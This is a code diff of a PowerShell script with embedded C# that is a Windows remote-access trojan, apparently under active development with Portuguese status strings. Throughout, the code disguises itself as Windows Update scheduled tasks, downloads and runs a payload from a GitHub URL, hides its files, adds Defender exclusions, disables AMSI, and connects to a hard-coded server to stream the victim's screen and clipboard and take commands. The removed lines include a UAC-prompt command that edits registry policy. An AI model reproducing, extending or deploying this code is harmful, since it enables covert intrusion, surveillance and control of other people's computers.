@@ -1,12 +1,11 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
 
-$ErrorActionPreference = 'SilentlyContinue'
 $serverIP = "198.1.195.204"
 $serverPort = 4000
 
 $h = [System.BitConverter]::ToString(
     [System.Security.Cryptography.MD5]::Create().ComputeHash(
-    [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))).Replace("-","").Substring(0,8).ToLower()
+        [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))).Replace("-","").Substring(0,8).ToLower()
 $installName = "WinUpdateSvc_$h"
 $taskName    = "MicrosoftWindowsUpdateService_$h"
 $mutexName   = "Global\WinUpdateSvcMutex_$h"
@@ -14,9 +13,9 @@ $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/
 
 function Get-InteractiveUser {
     try {
-        $e = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction Stop | Select -First 1
+        $e = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -EA Stop | Select -First 1
         if ($e) {
-            $o = Invoke-CimMethod -InputObject $e -MethodName GetOwner -ErrorAction Stop
+            $o = Invoke-CimMethod -InputObject $e -MethodName GetOwner -EA Stop
             if ($o -and $o.User) {
                 $sid = (New-Object Security.Principal.NTAccount($o.Domain, $o.User)).Translate([Security.Principal.SecurityIdentifier]).Value
                 return [pscustomobject]@{ Found = $true; Name = $o.User; Domain = $o.Domain; Sid = $sid }
@@ -66,22 +65,23 @@ function Install-Task {
     $t = Join-Path $Dir ("t_" + [guid]::NewGuid().ToString("N") + ".xml")
     [IO.File]::WriteAllText($t, $Xml, [Text.Encoding]::Unicode)
     $p = Start-Process schtasks.exe -ArgumentList "/create /tn `"$Name`" /xml `"$t`" /f" -WindowStyle Hidden -Wait -PassThru
-    Remove-Item $t -Force -ErrorAction SilentlyContinue
+    Remove-Item $t -Force -EA 0
     return ($p.ExitCode -eq 0)
 }
 
 function Repair-Installation {
     param([switch]$Trigger)
+    $EAP = 'SilentlyContinue'
     $base = "$env:ProgramData\Microsoft\Windows\Caches"
     $sys  = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
     $u    = Get-InteractiveUser
     $canUser = (-not $sys) -or $u.Found
 
-    $dirs = @(Get-ChildItem $base -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^[0-9a-f]{8}$' -and (Test-Path (Join-Path $_.FullName '.r9k')) })
+    $dirs = @(Get-ChildItem $base -Directory -EA 0 | ? { $_.Name -match '^[0-9a-f]{8}$' -and (Test-Path (Join-Path $_.FullName '.r9k')) })
     if (-not $dirs) {
         $d = Join-Path $base $h
-        New-Item -ItemType Directory -Path $d -Force -ErrorAction SilentlyContinue | Out-Null
-        Set-Content (Join-Path $d '.r9k') $h -Force -ErrorAction SilentlyContinue
+        New-Item -ItemType Directory -Path $d -Force | Out-Null
+        Set-Content (Join-Path $d '.r9k') $h -Force
         $dirs = @(Get-Item $d)
     }
 
@@ -93,28 +93,11 @@ function Repair-Installation {
         $taskB  = "MicrosoftWindowsUpdateBoot_$leaf"
         $runKey = "WinUpdateSvc_$leaf"
 
-        $needDownload = $false
-        if (-not (Test-Path $script)) {
-            $needDownload = $true
-        } else {
-            $len = (Get-Item $script -ErrorAction SilentlyContinue).Length
-            if ($len -eq $null -or $len -lt 1024) { $needDownload = $true }
+        if ((-not (Test-Path $script)) -or ((Get-Item $script).Length -lt 1024)) {
+            try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+                  (New-Object Net.WebClient).DownloadFile($myUrl, $script) } catch {}
         }
-
-        if ($needDownload) {
-            try { 
-                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                (New-Object Net.WebClient).DownloadFile($myUrl, $script) 
-            } catch {
-                try {
-                    Invoke-WebRequest -Uri $myUrl -OutFile $script -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue
-                } catch {}
-            }
-        }
-
-        if (Test-Path $script) { 
-            try { (Get-Item $script).Attributes = 'Hidden,System,ReadOnly' } catch {} 
-        }
+        if (Test-Path $script) { try { (Get-Item $script).Attributes = 'Hidden,System,ReadOnly' } catch {} }
 
         $vbs = Join-Path $dir "WinUpdateSvc_$leaf.vbs"
         if (Test-Path $vbs) { try { (Get-Item $vbs).Attributes='Normal'; Remove-Item $vbs -Force } catch {} }
@@ -137,7 +120,7 @@ function Repair-Installation {
         $inner = "`$p='$script';if(-not(Test-Path `$p)){`$d=Split-Path `$p;md `$d -Force|Out-Null;try{(New-Object Net.WebClient).DownloadFile('$myUrl',`$p)}catch{}};if(Test-Path `$p){& `$p -silent -repair -Trigger}"
         Install-Task $taskB (New-TaskXml "Microsoft Windows Update Boot" "powershell.exe" "-nop -w hidden -ep bypass -c `"$inner`"" "" -Boot) $dir | Out-Null
 
-        try { Add-MpPreference -ExclusionPath $dir -Force -ErrorAction SilentlyContinue } catch {}
+        try { Add-MpPreference -ExclusionPath $dir -Force } catch {}
         if ($Trigger -and $canUser) { schtasks /run /tn $taskU 2>$null | Out-Null }
     }
 }
@@ -158,7 +141,7 @@ if ($args -notcontains "-silent") {
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
         if ($mp -and ((-not $mp.RealTimeProtectionEnabled) -or (-not $mp.AntivirusEnabled))) { $defenderOff = $true }
-    } catch { $defenderOff = $true } 
+    } catch { }
 
     if (-not $defenderOff) {
         $sd = "$env:TEMP\sd_$h"
@@ -185,7 +168,7 @@ if ($args -notcontains "-silent") {
     }
 
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
-    Set-Content (Join-Path $dir '.r9k') $h -Force -ErrorAction SilentlyContinue
+    Set-Content (Join-Path $dir '.r9k') $h -Force
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
     Repair-Installation -Trigger
@@ -201,7 +184,7 @@ if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,
 $stamp = Join-Path $dir '.repair'
 $need  = $true
 if (Test-Path $stamp) { if (((Get-Date) - (Get-Item $stamp).LastWriteTime).TotalMinutes -lt 5) { $need = $false } }
-if ($need) { Repair-Installation; Set-Content $stamp (Get-Date).ToString('o') -Force -ErrorAction SilentlyContinue }
+if ($need) { Repair-Installation; Set-Content $stamp (Get-Date).ToString('o') -Force }
 
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0)) { exit }
@@ -249,7 +232,12 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("user32.dll")] public static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyWidth, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct CURSORINFO { public int cbSize; public int flags; public IntPtr hCursor; public POINT ptScreenPos; }
+        public struct CURSORINFO {
+            public int cbSize;
+            public int flags;
+            public IntPtr hCursor;
+            public POINT ptScreenPos;
+        }
         [StructLayout(LayoutKind.Sequential)]
         public struct POINT { public int X; public int Y; }
 
@@ -323,15 +311,6 @@ if (-not ("R9KAgent" -as [type])) {
         static long lastQuality = -1;
 
         static volatile bool cursorOverride = false;
-        static volatile bool connClosed = false;
-        static DateTime lastPongTime = DateTime.MinValue;
-
-        static void Log(string msg) {
-            try {
-                string p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Microsoft\Windows\Caches\debug_r9k.txt");
-                File.AppendAllText(p, DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " - " + msg + "\r\n");
-            } catch {}
-        }
 
         static void EnsureJpegCodec(long quality) {
             if (jpgCodec == null) {
@@ -349,7 +328,6 @@ if (-not ("R9KAgent" -as [type])) {
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
             try { SetProcessDPIAware(); } catch {}
-            Log("Iniciando agente. Tentando conectar em " + IP + ":" + PORT);
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
             Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
             Thread tClip = new Thread(ClipboardWatcher); tClip.IsBackground = true; tClip.Start();
@@ -360,15 +338,11 @@ if (-not ("R9KAgent" -as [type])) {
                 try {
                     myClient = new TcpClient();
                     myClient.NoDelay = true;
-                    myClient.SendTimeout = 30000;
-                    myClient.ReceiveTimeout = 0;
+                    myClient.SendTimeout = 2000;
+                    myClient.ReceiveTimeout = 60000;
                     IAsyncResult ar = myClient.BeginConnect(IP, PORT, null, null);
-                    if (!ar.AsyncWaitHandle.WaitOne(5000)) { 
-                        Log("TIMEOUT de conexao. Servidor " + IP + " nao respondeu.");
-                        myClient.Close(); throw new Exception("connect timeout"); 
-                    }
+                    if (!ar.AsyncWaitHandle.WaitOne(5000)) { myClient.Close(); throw new Exception("connect timeout"); }
                     myClient.EndConnect(ar);
-                    Log("CONECTADO! Enviando BANNER...");
                     NetworkStream myStream = myClient.GetStream();
                     StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                     StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
@@ -377,21 +351,20 @@ if (-not ("R9KAgent" -as [type])) {
 
                     myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
 
-                    connClosed = false;
-                    lastPongTime = DateTime.UtcNow;
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
                     Thread tBeat = new Thread(() => HeartbeatLoop(myClient, myWriter)); tBeat.IsBackground = true; tBeat.Start();
-                    
-                    while (!connClosed) {
-                        if ((DateTime.UtcNow - lastPongTime).TotalSeconds > 90) { 
-                            Log("Conexao morreu: Sem PONG ha 90s.");
-                            connClosed = true; break; 
-                        }
-                        Thread.Sleep(2000);
+                    while (true) {
+                        if (myClient.Client == null) break;
+                        bool dead = false;
+                        try {
+                            if (!myClient.Client.Connected) dead = true;
+                            else if (myClient.Client.Poll(0, SelectMode.SelectRead) && myClient.Client.Available == 0) dead = true;
+                        } catch { dead = true; }
+                        if (dead) break;
+                        Thread.Sleep(500);
                     }
-                } catch (Exception ex) {
-                    Log("FALHA: " + ex.Message);
+                } catch {
                 } finally {
                     streaming = false;
                     isAudioRunning = false;
@@ -403,16 +376,8 @@ if (-not ("R9KAgent" -as [type])) {
         }
 
         static void HeartbeatLoop(TcpClient myClient, StreamWriter myWriter) {
-            int failCount = 0;
-            while (!connClosed) {
-                try {
-                    lock (writeLock) { myWriter.WriteLine("PING"); }
-                    failCount = 0;
-                } catch {
-                    failCount++;
-                    if (failCount > 8) { connClosed = true; break; }
-                    Thread.Sleep(2000);
-                }
+            while (true) {
+                try { lock (writeLock) { myWriter.WriteLine("PING"); } } catch { break; }
                 Thread.Sleep(20000);
             }
         }
@@ -472,7 +437,6 @@ if (-not ("R9KAgent" -as [type])) {
                     ProcessCommand(cmd.Trim(), myWriter);
                 }
             } catch {}
-            connClosed = true;
             try { myClient.Close(); } catch {}
         }
 
@@ -490,25 +454,22 @@ if (-not ("R9KAgent" -as [type])) {
         }
 
         static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
-            int failCount = 0;
-            while (!connClosed) {
+            while (myClient.Connected) {
                 try {
                     if (streaming) {
                         string b64 = CaptureScreen(1440, 62);
                         if (b64 != null) {
-                            lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
-                            failCount = 0;
+                            lock (writeLock) {
+                                myWriter.Write("SCREEN:");
+                                myWriter.WriteLine(b64);
+                            }
                         } else {
                             Thread.Sleep(10);
                         }
                     } else {
                         Thread.Sleep(20);
                     }
-                } catch {
-                    failCount++;
-                    if (failCount > 8) { connClosed = true; break; }
-                    Thread.Sleep(500);
-                }
+                } catch { break; }
             }
         }
 
@@ -668,7 +629,6 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
-                if (cmd == "pong") { lastPongTime = DateTime.UtcNow; return; }
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; cursorOverride = false; lock (writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 if (cmd == "cursor_free") { cursorOverride = false; return; }
@@ -686,29 +646,6 @@ if (-not ("R9KAgent" -as [type])) {
                     int n = Screen.AllScreens.Length;
                     if (n > 1) { currentScreen = (currentScreen + 1) % n; lock (writeLock) { myWriter.WriteLine("MONITOR:" + currentScreen + "/" + n); } }
                     else { lock (writeLock) { myWriter.WriteLine("MONITOR:1/1"); } }
-                    return;
-                }
-                if (cmd.StartsWith("open_uac ")) {
-                    string app = cmd.Substring(9).Trim();
-                    try {
-                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true)) {
-                            if (key != null) key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
-                        }
-                        ProcessStartInfo psi = new ProcessStartInfo(app);
-                        psi.UseShellExecute = true;
-                        psi.Verb = "runas";
-                        Process.Start(psi);
-                        lock (writeLock) { myWriter.WriteLine("UAC_EXIBIDO_NA_TELA"); }
-                    } catch {}
-                    return;
-                }
-                if (cmd == "unblock_all") {
-                    BlockInput(false);
-                    UnblockAllApps();
-                    try { using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System", true)) { if (key != null) key.DeleteValue("DisableCMD", false); } } catch {}
-                    try { using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true)) { if (key != null) key.SetValue("EnableLUA", 1, RegistryValueKind.DWord); } } catch {}
-                    try { Form f = bannerForm; if (f != null) { f.BeginInvoke(new Action(() => f.Close())); } } catch {}
-                    lock (writeLock) { myWriter.WriteLine("SISTEMA_DESBLOQUEADO"); }
                     return;
                 }
                 if (cmd.StartsWith("clip_sync ")) {
